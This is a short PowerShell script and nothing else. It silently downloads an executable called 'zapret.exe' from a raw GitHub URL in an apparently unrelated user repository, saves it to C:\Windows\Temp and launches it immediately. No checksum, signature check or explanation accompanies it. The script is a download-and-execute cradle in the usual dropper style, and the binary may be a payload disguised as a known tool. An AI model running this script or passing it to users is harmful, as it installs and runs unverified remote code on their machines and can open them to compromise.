[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fosslas/users/main/zapret.exe' -OutFile 'C:\Windows\Temp\zapret.exe' -UseBasicParsing
Start-Process 'C:\Windows\Temp\zapret.exe'
